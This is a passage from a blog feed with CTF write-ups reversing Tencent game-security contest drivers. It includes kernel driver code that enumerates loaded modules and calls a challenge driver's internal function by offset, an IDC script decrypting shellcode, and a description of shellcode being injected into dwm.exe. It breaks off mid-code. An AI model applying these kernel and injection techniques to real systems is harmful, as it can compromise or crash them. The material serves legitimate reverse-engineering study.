上发现一些东西，这个是跟事件有关的东西，然后就再没什么思路了。</p><p>后面看才知道是要对这个事件做一些操作，把这个事件置为信号态之后就可以输出 <code>hello world</code> 了，这个壳不太会脱还是太菜了，这里也 copy 一下正确解法吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ntifs.h&quot;</span>   </span></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">PrintHelloWorld</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">UNICODE_STRING usEventName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HANDLE EventHandle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">RtlInitUnicodeString(&amp;usEventName, <span class="string">L&quot;\\BaseNamedObjects\\tp2020&quot;</span>);</span><br><span class="line">PRKEVENT pEvent = IoCreateNotificationEvent(&amp;usEventName, &amp;EventHandle);</span><br><span class="line"><span class="keyword">if</span> (!pEvent) &#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;IoCreateNotificationEvent Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">KeSetEvent(pEvent, <span class="number">0</span>, FALSE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> != DriverObject)</span><br><span class="line">DbgPrint(<span class="string">&quot;[%ws]Driver Upload, Driver Object Address:%p&quot;</span>, __FUNCTIONW__, DriverObject);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> &#123;</span><br><span class="line"></span><br><span class="line">KdBreakPoint();</span><br><span class="line">UNREFERENCED_PARAMETER(RegistryPath);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PrintHelloWorld();</span><br><span class="line"></span><br><span class="line">DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终也是成功输出，Mark 一下。</p><img src="/2024/03/30/tencent-race-2020-pre/15.png" class=""><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li>[1]<a href="http://www.qfrost.com/posts/ctf/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_2020/">腾讯游戏安全竞赛 2020 WriteUp</a></li><li>[2]<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-kddisabledebugger">KdDisableDebugger function (wdm.h)</a></li><li>[3]<a href="https://blog.csdn.net/qq1841370452/article/details/77900692">通过驱动对象得到Hookport.sys的基地址和大小</a></li></ul>]]></content>
    
    
    <summary type="html">复盘一下2020的腾讯游戏安全比赛</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="reverse" scheme="https://xia0ji233.github.io/categories/ctf/reverse/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="GameSec" scheme="https://xia0ji233.github.io/categories/Windows/GameSec/"/>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全大赛2022决赛题解</title>
    <link href="https://xia0ji233.github.io/2024/03/21/tencent-race-2022-final/"/>
    <id>https://xia0ji233.github.io/2024/03/21/tencent-race-2022-final/</id>
    <published>2024-03-21T15:00:00.000Z</published>
    <updated>2024-04-09T05:23:09.909Z</updated>
    
    <content type="html"><![CDATA[<p>今天试试复盘这个决赛</p><span id="more"></span><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>这里有一个在屏幕上画flag的小程序，可好像出了点问题，flag丢失了，需要把它找回来，并尝试截图留念。</p><img src="/2024/03/21/tencent-race-2022-final/1.png" class=""><p>找回flag样例：</p><img src="/2024/03/21/tencent-race-2022-final/2.png" class=""><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><ul><li>自行寻找办法加载驱动文件，再执行题目exe文件。</li><li>不得直接patch系统组件实现绘制（如：直接编写D3D代码绘制flag），只能对题目自身代码进行修改或调用。</li><li>找回的flag需要和预期图案（包括颜色）一致，如果绘制结果存在偏差会扣除一定分数。</li><li>修复后的flag截图操作必须在题目同一系统环境中进行（如：虚拟机运行题目则在虚拟机中截图，本机运行题目则在本机截图；不得拍照）。</li><li>赛后需要提交找回flag的<strong>截图</strong>、<strong>解题代码或文档</strong>和<strong>截图代码或文档</strong>进行评分，方法越多得分越高。</li><li>建议使用系统版本：Win10 1809、Win10 1903、Win10 1909、Win10 2004、Win10 20h1、Win10 20h2、Win10 21h1、Win10 21h2，在虚拟机中可能无法正常显示图形。</li><li>提交结果打包为XXX_writeup_A.zip，XXX为名称，A为提交序号，从1开始。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>P.S.，在做复现的时候发现虚拟机无法正常绘制，且自己 Win11 的物理机运行会蓝屏，因此本次复现不含动态调试部分，一切只停留于静态分析和理论阶段，刷它指定的系统成本过高了接受不了。</p><h3 id="驱动分析"><a href="#驱动分析" class="headerlink" title="驱动分析"></a>驱动分析</h3><p>IDA 打开，</p><p><code>sub_140001150</code> 函数很像是注册的驱动卸载函数。</p><p><code>sub_140001188</code> 函数应该就是获取了一下系统信息，没什么东西。</p><p><code>sub_140001414</code> 函数往下跟到 <code>sub_1400014A0</code> 函数有大东西，不过这个函数不是直接调用的，像是注册了某种回调，三环程序应该是处罚这个回调的。</p><p>开头通过调用 <code>sub_140001318</code> 函数获得了 <code>dwm.exe</code> 的 <code>EPROCESS</code> 结构。</p><img src="/2024/03/21/tencent-race-2022-final/4.png" class=""><p>对于接下来调用的函数</p><img src="/2024/03/21/tencent-race-2022-final/5.png" class=""><p><code>sub_140001000</code> 比较像是获取指定进程的某个 <code>DLL</code>，具体也跟进来看看</p><img src="/2024/03/21/tencent-race-2022-final/6.png" class=""><p>对于这些API，网上找到了一些说法：</p><p><strong>GetUserModuleBaseAddress():</strong> 实现取进程中模块基址，该功能在<code>《驱动开发：内核取应用层模块基地址》</code>中详细介绍过原理，这段代码核心原理如下所示，此处最需要注意的是如果是<code>32位进程</code>则我们需要得到<code>PPEB32 Peb32</code>结构体，该结构体通常可以直接使用<code>PsGetProcessWow64Process()</code>这个内核函数获取到，而如果是<code>64位进程</code>则需要将寻找PEB的函数替换为<code>PsGetProcessPeb()</code></p><p>这个地方也不难判断，就是获取 PEB 结构体，只不过多了一个 32 位和 64 位的判断，以 32 位的为例，中间有类似遍历链表的写法，如果找到了那么把某个结果保存到第二个参数指向的位置然后返回。</p><p>这里且当 <code>sub_140001264(v24, &quot;D3DCompile&quot;);</code> 函数是获取了某个函数的地址作为返回值出去的，随后是比较关键的点</p><img src="/2024/03/21/tencent-race-2022-final/7.png" class=""><p>调用了两次 <code>ZwAllocateVirtualMemory</code> 函数给进程申请内存，然后拷贝 shellcode 并进行了一定的异或混淆，最关键它把 <code>D3DCompile</code> 的地址和第二次申请内存的地址保存在第一次申请的内存后方，应该是方便 <code>shellcode</code> 找到虚拟代码，剩下的大概没有什么了，虽然没有运行成功大概也能猜测这个 shellcode 应该就是直接在屏幕绘制的代码了。</p><h3 id="exe分析"><a href="#exe分析" class="headerlink" title="exe分析"></a>exe分析</h3><p>三环程序比较大，先用火绒剑分析一下行为，主要是排除 exe 有跟内核做直接数据交互。</p><img src="/2024/03/21/tencent-race-2022-final/8.png" class=""><p>然而并没有，但是发现它也打开了 <code>D3DCompiler_47.dll</code>，于是从这里开始交叉引用，通过DLL路径交叉是一个比较好的思路，不管动态加载或者是运行时直接导入，都是可以大概分析到主逻辑的。</p><img src="/2024/03/21/tencent-race-2022-final/9.png" class=""><p>里面就进行了一个 <code>NtQuerySystemInformation</code>，外面是创建线程调用的这个函数，这里应该是触发回调的一个函数，为了验证也是准备去调试，但是它根本不触发这个回调，如图所见。</p><img src="/2024/03/21/tencent-race-2022-final/10.png" class=""><p>之前配置环境的时候一直以为是虚拟机没有 <code>dwm.exe</code> 这个进程，结果没想到是回调没有办法调用，于是我选择自己运行一个 dwm.exe 进程（我直接拿初赛的三环程序去改名然后运行，可以在第一个函数成功被获取），然后自己写一个驱动手动调用那个回调写shellcode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ntddk.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(* func)</span><span class="params">()</span>;</span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">bianliqudongmokuai</span><span class="params">(PUNICODE_STRING name, UINT64* pBaseAddr,UINT64* pSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY*TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        <span class="keyword">if</span> (RtlCompareUnicodeString(&amp;Tmp-&gt;BaseDllName, name, FALSE))</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;Found Module!\n&quot;</span>));</span><br><span class="line">            *pBaseAddr = (UINT64)(Tmp-&gt;DllBase);</span><br><span class="line">            *pSize = (UINT64)(Tmp-&gt;SizeOfImage);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">VOID <span class="title function_">Unload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;BYE xia0ji233\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Hello xia0ji233\n&quot;</span>));</span><br><span class="line">    g_Object = DriverObject;</span><br><span class="line">    DriverObject-&gt;DriverUnload = Unload;</span><br><span class="line">    UNICODE_STRING name;</span><br><span class="line">    UINT64 Base = <span class="number">0</span>;</span><br><span class="line">    UINT64 Size=<span class="number">0</span>;</span><br><span class="line">    RtlInitUnicodeString(&amp;name, <span class="string">L&quot;2022GameSafeRace.sys&quot;</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    bianliqudongmokuai(&amp;name,&amp;Base,&amp;Size);</span><br><span class="line">    <span class="keyword">if</span> (Base) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Base:%p Size:%x\n&quot;</span>), Base, Size);</span><br><span class="line">        func funcptr = (func)(Base + <span class="number">0x1490</span>);</span><br><span class="line">        DbgBreakPoint();</span><br><span class="line">        funcptr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下，用初赛的exe改名为dwm成功被这个函数获取到EProcess。</p><img src="/2024/03/21/tencent-race-2022-final/11.png" class=""><p>随后使用静态分析去解一下 <code>shellcode</code>，用下面的IDC脚本即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> start_ea = <span class="number">0x000000140005A00</span>;</span><br><span class="line">    <span class="keyword">auto</span> end_ea =  <span class="number">0x000000140005A00</span>+<span class="number">0x16E6</span>;</span><br><span class="line">    <span class="keyword">auto</span> len = end_ea - start_ea;</span><br><span class="line">    <span class="keyword">auto</span> ea=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (ea = start_ea; ea &lt; end_ea; ea++) &#123;</span><br><span class="line">        PatchByte(ea, Byte(ea)^<span class="number">0xC3</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密后的 <code>shellcode</code> 可以被直接反编译</p><img src="/2024/03/21/tencent-race-2022-final/12.png" class=""><p>看起来跟初赛是差不多的，相同的配方，相同的味道。</p><p>再往下看</p><img src="/2024/03/21/tencent-race-2022-final/13.png" class=""><p>就连这个ACE都是一样的，这里大概是一个全新的虚拟机了。</p><p>然后本来是打算搜字节码去看看shellcode有没有写成功的，但是发现还是搜不到，突然想到好像这个回调最后会 free 这片内存，所以决定直接改 sys 去把原来的 free 给 <code>jmp</code> 掉（还是失败，想复现太难了 qwq）。</p><p>还是老老实实分析虚拟机代码吧，看到 <code>unk_140004030</code>，它被放到了 <code>BaseAddress + 0x16E6</code> 的位置上，这里的代码在我们看来是在 <code>0x140005A00</code>，而直接分析可得，代码实际在 <code>&amp;qword_140009600[136]=0x140009600+136*8=0x140009a40</code> 的位置上。</p><p>然而这里没找到对应的数据，确实也不太会分析了，按理来说如果能直接调试运行到这的话是肯定可以定位shellcode找到位置dump出来的。</p><p>这里还原一下虚拟机的流程吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> code[] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> Stack[<span class="number">0x50</span>];</span><br><span class="line"><span class="type">unsigned</span> __int64 RIP_S=<span class="number">0</span>; <span class="comment">// rsi</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v10; <span class="comment">// r8</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> opcode; <span class="comment">// ecx</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">__int64 v13; <span class="comment">// rcx</span></span><br><span class="line">__int32 v14; <span class="comment">// r9d</span></span><br><span class="line">__int64 v15; <span class="comment">// r8</span></span><br><span class="line">__int64 v16; <span class="comment">// r9</span></span><br><span class="line">__int32 v17; <span class="comment">// edx</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v18; <span class="comment">// r10</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v19; <span class="comment">// rcx</span></span><br><span class="line">__int32 v20; <span class="comment">// r9d</span></span><br><span class="line">__int32 v21; <span class="comment">// r9d</span></span><br><span class="line">__int32 v22; <span class="comment">// eax</span></span><br><span class="line">__int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="built_in">memset</span>(Stack,<span class="number">0</span>,<span class="keyword">sizeof</span>(Stack));</span><br><span class="line">    Stack[<span class="number">8</span>] = <span class="number">50</span>;</span><br><span class="line">    Stack[<span class="number">9</span>] = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v10 = RIP_S;</span><br><span class="line">    opcode = code[RIP_S + <span class="number">272</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)opcode &gt; (<span class="type">int</span>)<span class="number">0x9A8ECD52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( opcode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xEE2362FC</span>:</span><br><span class="line">                ++RIP_S;</span><br><span class="line">                v21 = Stack[<span class="number">0</span>];</span><br><span class="line">                v22 = Stack[<span class="number">0</span>] * (Stack[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                Stack[<span class="number">0</span>] = code[RIP_S + <span class="number">272</span>] ^ <span class="number">0x414345</span>;</span><br><span class="line">                Stack[<span class="number">1</span>] = (Stack[<span class="number">0</span>] ^ (Stack[<span class="number">1</span>] + v21)) % <span class="number">256</span></span><br><span class="line">                    + (((Stack[<span class="number">0</span>] ^ (v21 * Stack[<span class="number">1</span>])) % <span class="number">256</span> + (((Stack[<span class="number">0</span>] ^ (Stack[<span class="number">1</span>] + v22)) % <span class="number">256</span>) &lt;&lt; <span class="number">8</span>)) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xEE69524A</span>:</span><br><span class="line">                v19 = <span class="number">0</span>;</span><br><span class="line">                v20 = code[v10 + <span class="number">273</span>];</span><br><span class="line">                code[RIP_S + <span class="number">272</span>] = <span class="number">-1</span>;</span><br><span class="line">                code[v10 + <span class="number">273</span>] = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">if</span> ( RIP_S != <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        code[v19 + <span class="number">272</span>] ^= v20;</span><br><span class="line">                        ++v19;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> ( v19 &lt; RIP_S - <span class="number">1</span> );</span><br><span class="line">                &#125;</span><br><span class="line">                ++RIP_S;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xFF4578AE</span>:</span><br><span class="line">                RIP_S += <span class="number">2</span>;</span><br><span class="line">                v16 = code[v10 + <span class="number">273</span>];</span><br><span class="line">                v17 = code[RIP_S + <span class="number">272</span>];</span><br><span class="line">                <span class="keyword">if</span> ( v16 )</span><br><span class="line">                &#123;</span><br><span class="line">                    v18 = RIP_S;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        code[++v18 + <span class="number">272</span>] ^= v17;</span><br><span class="line">                        v17 = code[v18 + <span class="number">271</span>] + <span class="number">305419896</span> * v17;</span><br><span class="line">                        --v16;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> ( v16 );</span><br><span class="line">                &#125;</span><br><span class="line">                code[v10 + <span class="number">272</span>] = <span class="number">-1</span>;</span><br><span class="line">                code[v10 + <span class="number">273</span>] = <span class="number">-1</span>;</span><br><span class="line">                code[RIP_S + <span class="number">272</span>] = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x1132EADF</span>:</span><br><span class="line">                RIP_S += <span class="number">2</span>;</span><br><span class="line">                Stack[code[RIP_S + <span class="number">272</span>]] = code[v10 + <span class="number">273</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">if</span> ( opcode == <span class="number">2018683631</span> &amp;&amp; code[<span class="number">272</span>] == <span class="number">-295083446</span> &amp;&amp; code[<span class="number">273</span>] == <span class="number">1755241482</span> &amp;&amp; code[<span class="number">274</span>] == <span class="number">-1729111095</span> )</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;call Paint(%d, %d, %d, %d, NAN, a3, a4, a5, a6, a7)&quot;</span>,Stack[<span class="number">4</span>], Stack[<span class="number">5</span>], Stack[<span class="number">6</span>], Stack[<span class="number">7</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( opcode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x9A8ECD52</span>:</span><br><span class="line">                Stack[<span class="number">0</span>] -= Stack[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x88659264</span>:</span><br><span class="line">                RIP_S += <span class="number">2</span>;</span><br><span class="line">                v12 = RIP_S;</span><br><span class="line">                v13 = code[v10 + <span class="number">273</span>];</span><br><span class="line">                v14 = code[RIP_S + <span class="number">272</span>];</span><br><span class="line">                code[v10 + <span class="number">272</span>] = <span class="number">-1</span>;</span><br><span class="line">                code[v10 + <span class="number">273</span>] = <span class="number">-1</span>;</span><br><span class="line">                v15 = v13;</span><br><span class="line">                code[RIP_S + <span class="number">272</span>] = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v13 )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        code[++v12 + <span class="number">272</span>] ^= v14;</span><br><span class="line">                        --v15;</span><br><span class="line">                    &#125;</span><br><span 